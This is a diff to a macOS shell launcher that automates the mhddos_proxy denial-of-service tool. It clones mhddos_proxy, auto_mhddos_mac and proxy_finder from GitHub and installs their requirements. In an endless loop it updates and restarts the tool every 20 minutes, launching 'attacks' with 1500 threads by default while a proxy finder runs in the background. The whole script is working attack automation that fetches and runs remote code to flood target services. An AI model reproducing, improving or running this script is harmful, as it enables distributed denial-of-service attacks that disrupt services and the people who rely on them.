@@ -4,6 +4,12 @@
 
 set -e
 
+#Just in case kill previous copy of mhddos_proxy
+echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
+pkill -f runner.py || true
+pkill -f finder.py || true
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"
+
 num=$(brew --version | grep -c "3.4.10" || true)
 echo -e "$num"
 if ((num == 1));
@@ -25,19 +31,21 @@ rm -rf auto_mhddos_mac
 git clone https://github.com/alexnest-ua/auto_mhddos_mac || true 
 rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy || true 
+rm -rf proxy_finder
+git clone https://github.com/alexnest-ua/proxy_finder.git || true
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
+python3.10 -m pip install -r requirements.txt
+#Install latest version of proxy_finder
+cd ~/proxy_finder
 python3.10 -m pip install -r requirements.txt
 
 restart_interval="1200"
 
 ulimit -n 1048576
 
-#Just in case kill previous copy of mhddos_proxy
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-pkill -f runner.py || true
-echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+
 
 
 threads="${1:-1500}"
@@ -79,7 +87,7 @@ fi
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters:  -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
 sleep 7
 
-trap 'echo signal received!; kill "${PID}"; wait "${PID}"' SIGINT SIGTERM
+trap 'echo signal received!; kill "${PID}"; kill "${PID1}"; wait "${PID}"; wait "${PID1}"' SIGINT SIGTERM
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
@@ -94,13 +102,25 @@ do
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
 	else
-		cd ~/mhddos_proxy
 		python3.10 -m pip install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
 		sleep 3
 	fi
 	
+	cd ~/proxy_finder
+
+  	num=$(git pull origin main | grep -c 'Already')
+	echo "$num"
+   	
+	if ((num == 1));
+	then
+		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder\n\n"
+	else
+		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder\n\n"
+		python3.10 -m pip install -r requirements.txt
+		exit #terminate old script
+	fi
 	
 	cd ~/auto_mhddos_mac
    	num=$(git pull origin main | grep -c 'Already' || true)
@@ -133,6 +153,9 @@ do
     	cd ~/mhddos_proxy
     	python3.10 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
 	PID="$!"
+	cd ~/proxy_finder
+    	python3.10 finder.py&
+	PID1="$!"
 	
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
@@ -143,6 +166,7 @@ do
    	#Just in case kill previous copy of mhddos_proxy
    	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
    	pkill -f runner.py || true
+	pkill -f finder.py || true
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
    	no_ddos_sleep=`expr $(shuf -i 1-3 -n 1) \* 60`
